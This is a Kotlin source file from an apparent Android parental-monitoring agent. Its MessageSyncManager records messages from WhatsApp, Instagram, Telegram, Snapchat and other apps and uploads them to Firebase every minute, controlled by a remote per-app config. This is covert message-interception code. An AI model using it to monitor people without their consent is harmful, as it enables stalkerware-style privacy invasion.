package com.example.xshield.childagent

import android.content.Context
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MessageSyncManager(private val context: Context, private val deviceId: String) {
    private val db = MessagesDatabase(context)
    private var syncJob: kotlinx.coroutines.Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private val TAG = "MessageSyncManager"
    
    // Store configuration here. By default everything is false to prevent tracking unless enabled.
    private var config: Map<String, Boolean> = mapOf()

    init {
        listenForConfigChanges()
    }

    fun startPeriodicSync() {
        if (syncJob?.isActive == true) return
        syncJob = scope.launch {
            while (isActive) {
                syncMessages()
                db.deleteOldMessages()
                delay(60_000) // 60 seconds
            }
        }
    }

    fun stopSync() {
        syncJob?.cancel()
    }

    fun forceSync() {
        scope.launch { syncMessages() }
    }

    fun addMessageIfEnabled(message: InstantMessage) {
        val appKey = getAppKey(message.app)
        if (config[appKey] == true) {
            db.addMessage(message)
            checkThresholdAndSync()
        }
    }

    private fun checkThresholdAndSync() {
        scope.launch {
            val count = db.getUnsyncedMessages().size
            if (count >= 50) {
                syncMessages()
            }
        }
    }

    private suspend fun syncMessages() {
        withContext(Dispatchers.IO) {
            val unsynced = db.getUnsyncedMessages()
            if (unsynced.isEmpty()) return@withContext

            try {
                // Determine Firebase RTDB to use. Following the plan, we use the Media RTDB.
                val mediaApp = FirebaseApp.getInstance("media")
                val rtdb = FirebaseDatabase.getInstance(mediaApp)
                val ref = rtdb.getReference("instant_messaging/$deviceId/messages")

                val updates = mutableMapOf<String, Any>()
                val syncedIds = mutableListOf<String>()

                for (msg in unsynced) {
                    val key = ref.push().key ?: continue
                    val msgMap = mapOf(
                        "id" to msg.id,
                        "app" to msg.app,
                        "sender" to msg.sender,
                        "message" to msg.message,
                        "direction" to msg.direction,
                        "timestamp" to msg.timestamp
                    )
                    updates[key] = msgMap
                    syncedIds.add(msg.id)
                }

                ref.updateChildren(updates).addOnSuccessListener {
                    scope.launch {
                        db.markMessagesAsSynced(syncedIds)
                        Log.d(TAG, "Synced ${syncedIds.size} messages to Firebase")
                    }
                }.addOnFailureListener {
                    Log.e(TAG, "Failed to sync messages", it)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Exception during sync", e)
            }
        }
    }

    private fun listenForConfigChanges() {
        try {
            val mediaApp = FirebaseApp.getInstance("media")
            val ref = FirebaseDatabase.getInstance(mediaApp).getReference("instant_messaging/$deviceId/config")
            ref.addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val newConfig = mutableMapOf<String, Boolean>()
                    snapshot.children.forEach {
                        newConfig[it.key ?: ""] = it.getValue(Boolean::class.java) ?: false
                    }
                    config = newConfig
                    Log.d(TAG, "Updated IM config: $config")
                }

                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                    Log.e(TAG, "Failed to read IM config", error.toException())
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up config listener", e)
        }
    }

    private fun getAppKey(packageName: String): String {
        return when (packageName) {
            "com.whatsapp" -> "whatsapp"
            "com.instagram.android" -> "instagram"
            "org.telegram.messenger" -> "telegram"
            "com.snapchat.android" -> "snapchat"
            "com.facebook.katana", "com.facebook.orca" -> "facebook"
            "com.twitter.android" -> "x"
            "com.google.android.youtube" -> "youtube"
            else -> packageName
        }
    }
}
